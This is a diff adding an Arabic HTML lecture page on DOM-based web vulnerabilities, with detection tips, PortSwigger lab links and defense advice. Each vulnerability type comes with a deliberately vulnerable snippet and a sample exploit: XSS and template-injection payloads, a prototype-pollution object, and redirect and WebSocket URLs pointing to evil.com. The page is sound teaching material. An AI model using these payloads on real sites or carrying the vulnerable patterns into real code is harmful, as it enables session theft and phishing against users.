@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محاضرة ثغرات DOM-based</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; line-height: 1.6; color: #e8eaed; background: #151b2f; min-height: 100vh; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 48px; padding: 64px 24px; background: linear-gradient(135deg, #1a2125, #203942); border-radius: 12px; box-shadow: 0 4px 24px rgb(33, 48, 70); }
+        .header h1 { font-size: 2.5rem; font-weight: 400; color: #ffffff; margin-bottom: 16px; letter-spacing: -0.5px; }
+        .header .subtitle { font-size: 1.1rem; font-weight: 300; color: rgba(255, 255, 255, 0.9); margin-bottom: 24px; }
+        .lecture-info { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; margin-top: 20px; }
+        .info-item { background: rgba(255, 255, 255, 0.2); padding: 12px 24px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.3); color: #ffffff; font-weight: 500; }
+        .info-item i { color: #ffffff; margin-left: 8px; }
+        .nav-menu { background: #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 32px; border: 1px solid #2d3748; box-shadow: 0 1px 6px rgba(26, 35, 50, 0.4); }
+        .nav-menu h3 { color: #e8eaed; font-size: 1.5rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
+        .nav-menu ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
+        .nav-menu a { display: flex; align-items: center; padding: 12px 16px; color: #e8eaed; text-decoration: none; border-radius: 8px; transition: all 0.2s ease; border: 1px solid transparent; }
+        .nav-menu a:hover { background: #2d3748; border-color: #3b475d; }
+        section { background: #0f1724; border: 1px solid #2b3447; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3); }
+        h2 { color: #ffffff; font-size: 1.6rem; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
+        h3 { color: #a5b4fc; font-size: 1.2rem; margin: 14px 0; }
+        h4 { color: #c7d2fe; font-size: 1.1rem; margin: 12px 0 8px 0; font-weight: 500; }
+        p { color: #c7d2fe; margin-bottom: 12px; line-height: 1.7; }
+        .list { margin: 10px 0 0 0; padding-right: 18px; color: #c7d2fe; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin: 20px 0; }
+        .card { background: #0c1220; border: 1px solid #263148; border-radius: 10px; padding: 18px; }
+        .code-block { 
+            background: #0d1117; 
+            border: 1px solid #30363d; 
+            border-radius: 6px; 
+            padding: 16px; 
+            color: #f0f6fc; 
+            font-family: 'SFMono-Regular', 'Consolas', 'Liberation Mono', 'Menlo', monospace; 
+            overflow-x: auto; 
+            margin: 16px 0; 
+            font-size: 14px; 
+            line-height: 1.45;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            white-space: pre-wrap;
+        }
+        .tip { background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); color: #d1fae5; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .warn { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); color: #fde68a; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .danger { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.25); color: #fecaca; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .attack-demo { background: #1a1a2e; border: 1px solid #16213e; border-radius: 10px; padding: 20px; margin: 16px 0; }
+        .attack-demo h4 { color: #ff6b6b; margin-bottom: 12px; }
+        .lab-card { background: linear-gradient(135deg, #1e3a8a, #1e40af); border: 1px solid #3b82f6; border-radius: 12px; padding: 20px; margin: 12px 0; }
+        .lab-card h4 { color: #ffffff; margin-bottom: 8px; }
+        .lab-card p { color: #dbeafe; font-size: 0.95rem; }
+        .lab-link { display: inline-block; background: #3b82f6; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; margin-top: 10px; font-size: 0.9rem; }
+        .lab-link:hover { background: #2563eb; }
+        .comparison-table { width: 100%; border-collapse: collapse; margin: 20px 0; background: #0c1220; border-radius: 8px; overflow: hidden; }
+        .comparison-table th, .comparison-table td { padding: 12px; text-align: right; border-bottom: 1px solid #263148; }
+        .comparison-table th { background: #1e3a8a; color: #ffffff; font-weight: 500; }
+        .comparison-table tr:hover { background: #1a2332; }
+        .mermaid { 
+            background: #1a2332 !important; 
+            border: 1px solid #2d3748; 
+            border-radius: 8px; 
+            padding: 16px; 
+            margin: 16px 0; 
+            color: #e8eaed !important;
+        }
+        .mermaid svg { background: #1a2332 !important; }
+        .mermaid .node rect, .mermaid .node circle, .mermaid .node ellipse, .mermaid .node polygon {
+            fill: #1a2332 !important; stroke: #2d3748 !important; color: #e8eaed !important;
+        }
+        .mermaid .edgeLabel { background-color: #1a2332 !important; color: #e8eaed !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-code"></i> ثغرات DOM-based</h1>
+            <div class="subtitle">استغلال نقاط الضعف في نموذج كائن المستند</div>
+            <div class="lecture-info">
+                <div class="info-item"><i class="fas fa-clock"></i> 2 ساعة</div>
+                <div class="info-item"><i class="fas fa-flask"></i> 8 مختبرات</div>
+                <div class="info-item"><i class="fas fa-signal"></i> متوسط إلى متقدم</div>
+                <div class="info-item"><i class="fas fa-shield-alt"></i> حماية شاملة</div>
+            </div>
+        </div>
+
+        <div class="nav-menu">
+            <h3>محتويات المحاضرة</h3>
+            <ul>
+                <li><a href="#intro"><i class="fas fa-info-circle"></i> مقدمة</a></li>
+                <li><a href="#dom-overview"><i class="fas fa-sitemap"></i> نظرة عامة على DOM</a></li>
+                <li><a href="#vulnerability-types"><i class="fas fa-bug"></i> أنواع الثغرات</a></li>
+                <li><a href="#comparison"><i class="fas fa-balance-scale"></i> مقارنة شاملة</a></li>
+                <li><a href="#detection"><i class="fas fa-search"></i> طرق الاكتشاف</a></li>
+                <li><a href="#exploitation"><i class="fas fa-crosshairs"></i> طرق الاستغلال</a></li>
+                <li><a href="#labs"><i class="fas fa-flask"></i> مختبرات عملية</a></li>
+                <li><a href="#defense"><i class="fas fa-shield-halved"></i> طرق الحماية</a></li>
+                <li><a href="#summary"><i class="fas fa-list-check"></i> الخلاصة</a></li>
+            </ul>
+        </div>
+
+        <section id="intro">
+            <h2><i class="fas fa-info-circle"></i> مقدمة - ما هي ثغرات DOM-based؟</h2>
+            
+            <p>مرحباً بكم في محاضرة ثغرات DOM-based! 🎯</p>
+            
+            <p>ثغرات <strong>DOM-based</strong> هي فئة خاصة من الثغرات التي تحدث عندما يتم التلاعب بنموذج كائن المستند (Document Object Model) في متصفح الضحية. هذه الثغرات خطيرة لأنها تحدث بالكامل في جانب العميل، مما يجعل اكتشافها صعباً وقد لا تظهر في سجلات الخادم.</p>
+
+            <div class="tip">
+                <h4><i class="fas fa-lightbulb"></i> ما ستتعلمه في هذه المحاضرة</h4>
+                <ul class="list">
+                    <li>🎯 فهم مفهوم DOM وكيفية عمله</li>
+                    <li>🕵️ 9 أنواع مختلفة من ثغرات DOM-based</li>
+                    <li>⚖️ مقارنة شاملة بين جميع الأنواع</li>
+                    <li>🔍 طرق اكتشاف واستغلال كل نوع</li>
+                    <li>🧪 8 مختبرات عملية متدرجة الصعوبة</li>
+                    <li>🛡️ استراتيجيات الحماية والدفاع</li>
+                    <li>🔧 أدوات الاختبار المتقدمة</li>
+                </ul>
+            </div>
+
+            <div class="danger">
+                <h4><i class="fas fa-exclamation-triangle"></i> لماذا ثغرات DOM-based خطيرة؟</h4>
+                <ul class="list">
+                    <li><strong>جانب العميل:</strong> تحدث بالكامل في متصفح الضحية دون تفاعل مع الخادم</li>
+                    <li><strong>صعوبة الاكتشاف:</strong> قد لا تظهر في سجلات الخادم أو أدوات المراقبة التقليدية</li>
+                    <li><strong>تنوع التأثيرات:</strong> من سرقة البيانات إلى التحكم الكامل في التطبيق</li>
+                    <li><strong>انتشار واسع:</strong> تؤثر على جميع التطبيقات التي تستخدم JavaScript</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="dom-overview">
+            <h2><i class="fas fa-sitemap"></i> نظرة عامة على DOM</h2>
+            
+            <p>نموذج كائن المستند (DOM) هو تمثيل برمجي لصفحة HTML، حيث يتم تنظيم جميع العناصر في شكل شجرة من العقد (nodes). كل عنصر HTML يصبح عقدة في هذه الشجرة.</p>
+
+            <div class="mermaid">
+graph TD
+    A[Document] --> B[HTML]
+    B --> C[Head]
+    B --> D[Body]
+    C --> E[Title]
+    C --> F[Meta]
+    D --> G[Div]
+    D --> H[Script]
+    G --> I[P]
+    G --> J[Img]
+    H --> K[JavaScript Code]
+    style A fill:#1e3a8a
+    style B fill:#3b82f6
+    style H fill:#ef4444
+    style K fill:#f59e0b
+            </div>
+
+            <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال: هيكل DOM بسيط</span>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;صفحة ويب&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id="content"&gt;
+        &lt;p&gt;مرحباً بالعالم!&lt;/p&gt;
+        &lt;img src="image.jpg" alt="صورة"&gt;
+    &lt;/div&gt;
+    &lt;script&gt;
+        // JavaScript يمكنه التلاعب بـ DOM
+        document.getElementById('content').innerHTML = 'تم التلاعب!';
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            </div>
+
+            <div class="warn">
+                <h4>⚠️ مصادر البيانات في DOM</h4>
+                <p>JavaScript يمكنه قراءة البيانات من مصادر متعددة:</p>
+                <ul class="list">
+                    <li><strong>URL Parameters:</strong> <code>location.search</code>, <code>location.hash</code></li>
+                    <li><strong>Cookies:</strong> <code>document.cookie</code></li>
+                    <li><strong>LocalStorage:</strong> <code>localStorage.getItem()</code></li>
+                    <li><strong>SessionStorage:</strong> <code>sessionStorage.getItem()</code></li>
+                    <li><strong>postMessage:</strong> <code>window.addEventListener('message')</code></li>
+                    <li><strong>WebSocket URLs:</strong> <code>new WebSocket(url)</code></li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="vulnerability-types">
+            <h2><i class="fas fa-bug"></i> أنواع ثغرات DOM-based</h2>
+            
+            <div class="grid">
+                <div class="card">
+                    <h3>🎯 1. DOM-based XSS</h3>
+                    <p><strong>التعريف:</strong> حقن كود JavaScript خبيث من خلال التلاعب بـ DOM.</p>
+                    <p><strong>المصدر:</strong> URL parameters, localStorage, cookies</p>
+                    <p><strong>التأثير:</strong> سرقة cookies، تحكم في المتصفح</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+var userInput = location.hash.slice(1);
+document.getElementById('output').innerHTML = userInput;
+
+// الاستغلال
+https://site.com/page#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔄 2. DOM-based Open Redirect</h3>
+                    <p><strong>التعريف:</strong> إعادة توجيه المستخدم لموقع ضار من خلال التلاعب بـ DOM.</p>
+                    <p><strong>المصدر:</strong> URL parameters, postMessage</p>
+                    <p><strong>التأثير:</strong> التصيد الاحتيالي، سرقة البيانات</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+var redirectUrl = location.search.split('redirect=')[1];
+window.location.href = redirectUrl;
+
+// الاستغلال
+https://site.com/page?redirect=https://evil.com</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📝 3. DOM-based Client-Side Template Injection</h3>
+                    <p><strong>التعريف:</strong> حقن قوالب خبيثة في محركات القوالب جانب العميل.</p>
+                    <p><strong>المصدر:</strong> URL parameters, user input</p>
+                    <p><strong>التأثير:</strong> تنفيذ كود JavaScript، سرقة البيانات</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف (AngularJS)
+var template = '&lt;div&gt;' + userInput + '&lt;/div&gt;';
+$compile(template)($scope);
+
+// الاستغلال
+{{constructor.constructor('alert(1)')()}}</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>💥 4. DOM Clobbering</h3>
+                    <p><strong>التعريف:</strong> استبدال خصائص JavaScript من خلال عناصر HTML.</p>
+                    <p><strong>المصدر:</strong> عناصر HTML مع id/name</p>
+                    <p><strong>التأثير:</strong> تعطيل الوظائف، تنفيذ كود خبيث</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+if (window.someFunction) {
+    window.someFunction();
+}
+
+// الاستغلال
+&lt;form id="someFunction"&gt;&lt;input name="alert"&gt;&lt;/form&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🧬 5. DOM-based Prototype Pollution</h3>
+                    <p><strong>التعريف:</strong> تلويث prototype chain للكائنات JavaScript.</p>
+                    <p><strong>المصدر:</strong> JSON.parse, Object.assign</p>
+                    <p><strong>التأثير:</strong> تنفيذ كود، تعديل السلوك</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+var userData = JSON.parse(userInput);
+Object.assign(target, userData);
+
+// الاستغلال
+{"__proto__": {"isAdmin": true}}</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>💾 6. DOM-based LocalStorage/SessionStorage Poisoning</h3>
+                    <p><strong>التعريف:</strong> حقن بيانات خبيثة في مخازن المتصفح المحلية.</p>
+                    <p><strong>المصدر:</strong> localStorage, sessionStorage</p>
+                    <p><strong>التأثير:</strong> سرقة البيانات، تنفيذ كود خبيث</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+localStorage.setItem('userData', userInput);
+var data = localStorage.getItem('userData');
+eval(data);
+
+// الاستغلال
+localStorage.setItem('userData', 'alert(document.cookie)');</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📨 7. DOM-based postMessage Manipulation</h3>
+                    <p><strong>التعريف:</strong> استغلال رسائل postMessage بين النوافذ.</p>
+                    <p><strong>المصدر:</strong> window.postMessage</p>
+                    <p><strong>التأثير:</strong> سرقة البيانات، تنفيذ كود</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+window.addEventListener('message', function(event) {
+    if (event.origin === 'trusted.com') {
+        eval(event.data);
+    }
+});
+
+// الاستغلال
+window.postMessage('alert(document.cookie)', '*');</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔌 8. DOM-based WebSocket URL Poisoning</h3>
+                    <p><strong>التعريف:</strong> تسميم عنوان URL لاتصال WebSocket.</p>
+                    <p><strong>المصدر:</strong> URL parameters, user input</p>
+                    <p><strong>التأثير:</strong> تسريب البيانات، هجمات MITM</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+var wsUrl = location.search.split('ws=')[1];
+var ws = new WebSocket(wsUrl);
+
+// الاستغلال
+https://site.com/page?ws=ws://evil.com/steal</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🍪 9. DOM-based Cookie Manipulation</h3>
+                    <p><strong>التعريف:</strong> التلاعب بملفات تعريف الارتباط من خلال DOM.</p>
+                    <p><strong>المصدر:</strong> document.cookie</p>
+                    <p><strong>التأثير:</strong> سرقة الجلسات، التصيد</p>
+                    <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال</span>
+<pre><code>// الكود الضعيف
+var cookieValue = location.hash.slice(1);
+document.cookie = 'session=' + cookieValue;
+
+// الاستغلال
+https://site.com/page#malicious-session-id</code></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="comparison">
+            <h2><i class="fas fa-balance-scale"></i> مقارنة شاملة بين أنواع ثغرات DOM-based</h2>
+            
+            <p>هذا الجدول يساعدك على فهم الفروق الرئيسية بين أنواع ثغرات DOM-based وكيفية تمييزها:</p>
+
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>نوع الثغرة</th>
+                        <th>المصدر الرئيسي</th>
+                        <th>طريقة الاستغلال</th>
+                        <th>التأثير</th>
+                        <th>صعوبة الاكتشاف</th>
+                        <th>أدوات الاختبار</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>DOM-based XSS</strong></td>
+                        <td>URL, localStorage, cookies</td>
+                        <td>حقن JavaScript</td>
+                        <td>سرقة cookies, تحكم</td>
+                        <td>متوسط</td>
+                        <td>Burp Suite, DOM Invader</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DOM-based Open Redirect</strong></td>
+                        <td>URL parameters</td>
+                        <td>تلاعب بـ location</td>
+                        <td>تصيد احتيالي</td>
+                        <td>سهل</td>
+                        <td>Burp Suite, Browser DevTools</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Client-Side Template Injection</strong></td>
+                        <td>User input, URL</td>
+                        <td>حقن قوالب</td>
+                        <td>تنفيذ كود</td>
+                        <td>صعب</td>
+                        <td>Burp Suite, Template Debugger</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DOM Clobbering</strong></td>
+                        <td>HTML elements</td>
+                        <td>استبدال خصائص</td>
+                        <td>تعطيل وظائف</td>
+                        <td>متوسط</td>
+                        <td>Browser DevTools, Manual Testing</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Prototype Pollution</strong></td>
+                        <td>JSON, Object.assign</td>
+                        <td>تلويث prototype</td>
+                        <td>تعديل السلوك</td>
+                        <td>صعب جداً</td>
+                        <td>Prototype Pollution Scanner</td>
+                    </tr>
+                    <tr>
+                        <td><strong>LocalStorage Poisoning</strong></td>
+                        <td>localStorage API</td>
+                        <td>حقن بيانات خبيثة</td>
+                        <td>سرقة بيانات</td>
+                        <td>متوسط</td>
+                        <td>Browser DevTools, Manual Testing</td>
+                    </tr>
+                    <tr>
+                        <td><strong>postMessage Manipulation</strong></td>
+                        <td>window.postMessage</td>
+                        <td>رسائل خبيثة</td>
+                        <td>سرقة بيانات</td>
+                        <td>صعب</td>
+                        <td>Burp Suite, postMessage Monitor</td>
+                    </tr>
+                    <tr>
+                        <td><strong>WebSocket URL Poisoning</strong></td>
+                        <td>URL parameters</td>
+                        <td>تسميم WebSocket URL</td>
+                        <td>تسريب بيانات</td>
+                        <td>متوسط</td>
+                        <td>Burp Suite, WebSocket Analyzer</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Cookie Manipulation</strong></td>
+                        <td>document.cookie</td>
+                        <td>تلاعب بـ cookies</td>
+                        <td>سرقة جلسات</td>
+                        <td>سهل</td>
+                        <td>Browser DevTools, Cookie Editor</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="tip">
+                <h4>💡 كيفية التمييز بين أنواع الثغرات</h4>
+                <ul class="list">
+                    <li><strong>DOM-based XSS:</strong> ابحث عن <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code></li>
+                    <li><strong>Open Redirect:</strong> ابحث عن <code>window.location</code>, <code>location.href</code></li>
+                    <li><strong>Template Injection:</strong> ابحث عن محركات قوالب مثل AngularJS, Handlebars</li>
+                    <li><strong>DOM Clobbering:</strong> ابحث عن استخدام <code>window.elementName</code></li>
+                    <li><strong>Prototype Pollution:</strong> ابحث عن <code>Object.assign</code>, <code>JSON.parse</code></li>
+                    <li><strong>Storage Poisoning:</strong> ابحث عن <code>localStorage</code>, <code>sessionStorage</code></li>
+                    <li><strong>postMessage:</strong> ابحث عن <code>addEventListener('message')</code></li>
+                    <li><strong>WebSocket:</strong> ابحث عن <code>new WebSocket()</code></li>
+                    <li><strong>Cookie:</strong> ابحث عن <code>document.cookie</code></li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="detection">
+            <h2><i class="fas fa-search"></i> طرق اكتشاف ثغرات DOM-based</h2>
+            
+            <div class="grid">
+                <div class="card">
+                    <h3>🔍 1. الفحص اليدوي</h3>
+                    <ul class="list">
+                        <li>فحص كود JavaScript في الصفحة</li>
+                        <li>البحث عن مصادر البيانات المشبوهة</li>
+                        <li>اختبار نقاط الإدخال المختلفة</li>
+                        <li>مراقبة سلوك التطبيق</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🛠️ 2. أدوات الاختبار</h3>
+                    <ul class="list">
+                        <li><strong>Burp Suite:</strong> تحليل الطلبات والردود</li>
+                        <li><strong>DOM Invader:</strong> اكتشاف ثغرات DOM</li>
+                        <li><strong>Browser DevTools:</strong> فحص DOM ومراقبة التغييرات</li>
+                        <li><strong>OWASP ZAP:</strong> فحص تلقائي للثغرات</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>📊 3. مؤشرات الثغرات</h3>
+                    <ul class="list">
+                        <li>استخدام <code>eval()</code> أو <code>innerHTML</code></li>
+                        <li>قراءة من URL parameters بدون تطهير</li>
+                        <li>استخدام <code>document.write</code></li>
+                        <li>التعامل مع localStorage/sessionStorage</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال: فحص DOM-based XSS</span>
+<pre><code>// ابحث عن هذه الأنماط في الكود:
+document.getElementById('output').innerHTML = userInput;
+document.write(location.search);
+eval(localStorage.getItem('data'));
+window.location.href = redirectUrl;
+new WebSocket(wsUrl);</code></pre>
+            </div>
+        </section>
+
+        <section id="exploitation">
+            <h2><i class="fas fa-crosshairs"></i> طرق استغلال ثغرات DOM-based</h2>
+            
+            <div class="attack-demo">
+                <h4>🎯 استغلال DOM-based XSS</h4>
+                <div class="mermaid">
+sequenceDiagram
+    participant A as 🥷 المهاجم
+    participant V as 👤 الضحية
+    participant B as 🌐 متصفح الضحية
+    
+    A->>A: 1. ينشئ رابطاً خبيثاً
+    Note over A: site.com/page#&lt;script&gt;alert(1)&lt;/script&gt;
+    A->>V: 2. يرسل الرابط للضحية
+    V->>B: 3. الضحية يزور الرابط
+    B->>B: 4. JavaScript يقرأ من location.hash
+    B->>B: 5. ينفذ الكود الخبيث 💥
+    B-->>A: 6. معلومات الضحية تُرسل للمهاجم
+                </div>
+            </div>
+
+            <div class="attack-demo">
+                <h4>🔄 استغلال DOM-based Open Redirect</h4>
+                <div class="mermaid">
+sequenceDiagram
+    participant A as 🥷 المهاجم
+    participant V as 👤 الضحية
+    participant B as 🌐 متصفح الضحية
+    participant E as 🚫 موقع ضار
+    
+    A->>A: 1. ينشئ رابطاً خبيثاً
+    Note over A: site.com/page?redirect=evil.com
+    A->>V: 2. يرسل الرابط للضحية
+    V->>B: 3. الضحية يزور الرابط
+    B->>B: 4. JavaScript يقرأ redirect parameter
+    B->>E: 5. يتم التوجيه لموقع ضار 💥
+    E->>V: 6. الضحية يرى صفحة تصيد
+                </div>
+            </div>
+
+            <div class="warn">
+                <h4>⚠️ نصائح مهمة للاستغلال</h4>
+                <ul class="list">
+                    <li><strong>افهم السياق:</strong> أين يتم عرض/استخدام البيانات؟</li>
+                    <li><strong>اختبر تدريجياً:</strong> ابدأ باختبارات بسيطة ثم تطور</li>
+                    <li><strong>استخدم DevTools:</strong> لمراقبة التغييرات في DOM</li>
+                    <li><strong>اختبر في بيئة آمنة:</strong> لا تختبر على مواقع حقيقية</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="labs">
+            <h2><i class="fas fa-flask"></i> مختبرات عملية (8) - PortSwigger Academy</h2>
+            <p>مختبرات متدرجة الصعوبة لتطبيق ما تعلمته عملياً:</p>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 1: DOM XSS in document.write sink using location.search source</h4>
+                <p><strong>الهدف:</strong> استغلال DOM XSS باستخدام <code>document.write</code></p>
+                <p><strong>التقنية:</strong> حقن HTML/JavaScript في query string</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 2: DOM XSS in innerHTML sink using location.search source</h4>
+                <p><strong>الهدف:</strong> استغلال DOM XSS باستخدام <code>innerHTML</code></p>
+                <p><strong>التقنية:</strong> حقن HTML في query string</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 3: DOM XSS in jQuery anchor href attribute sink using location.search source</h4>
+                <p><strong>الهدف:</strong> استغلال DOM XSS في jQuery</p>
+                <p><strong>التقنية:</strong> حقن في سمة href</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 4: DOM XSS in jQuery selector sink using a hashchange event</h4>
+                <p><strong>الهدف:</strong> استغلال DOM XSS مع hashchange event</p>
+                <p><strong>التقنية:</strong> استخدام URL fragment</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 5: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h4>
+                <p><strong>الهدف:</strong> استغلال AngularJS template injection</p>
+                <p><strong>التقنية:</strong> حقن AngularJS expressions</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 6: DOM XSS combined with reflected and stored data</h4>
+                <p><strong>الهدف:</strong> استغلال DOM XSS مع بيانات مخزنة</p>
+                <p><strong>التقنية:</strong> دمج أنواع مختلفة من XSS</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-combined-with-reflected-and-stored" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 7: DOM XSS in third-party dependencies</h4>
+                <p><strong>الهدف:</strong> استغلال ثغرات في مكتبات خارجية</p>
+                <p><strong>التقنية:</strong> استغلال jQuery أو AngularJS</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-third-party-libraries" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 8: DOM XSS via client-side prototype pollution</h4>
+                <p><strong>الهدف:</strong> استغلال prototype pollution</p>
+                <p><strong>التقنية:</strong> تلويث prototype chain</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-prototype-pollution" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+        </section>
+
+        <section id="defense">
+            <h2><i class="fas fa-shield-halved"></i> طرق الحماية من ثغرات DOM-based</h2>
+            
+            <div class="grid">
+                <div class="card">
+                    <h3>✅ 1. تطهير المدخلات</h3>
+                    <ul class="list">
+                        <li>تشفير جميع المدخلات قبل استخدامها</li>
+                        <li>استخدام مكتبات التطهير الموثوقة</li>
+                        <li>التحقق من صحة البيانات</li>
+                        <li>تجنب استخدام <code>eval()</code></li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🚫 2. تجنب المصادر غير الآمنة</h3>
+                    <ul class="list">
+                        <li>لا تثق بـ <code>location.search</code> أو <code>location.hash</code></li>
+                        <li>تجنب استخدام <code>innerHTML</code> مع بيانات المستخدم</li>
+                        <li>لا تستخدم <code>document.write</code></li>
+                        <li>احذر من <code>localStorage</code> و <code>sessionStorage</code></li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🔒 3. استخدام APIs آمنة</h3>
+                    <ul class="list">
+                        <li>استخدم <code>textContent</code> بدلاً من <code>innerHTML</code></li>
+                        <li>استخدم <code>createElement</code> و <code>appendChild</code></li>
+                        <li>استخدم <code>JSON.parse</code> بحذر</li>
+                        <li>تحقق من origin في postMessage</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🛡️ 4. Content Security Policy (CSP)</h3>
+                    <ul class="list">
+                        <li>منع تنفيذ inline scripts</li>
+                        <li>تقييد مصادر JavaScript</li>
+                        <li>منع استخدام <code>eval()</code></li>
+                        <li>تقييد استخدام <code>unsafe-inline</code></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="code-block">
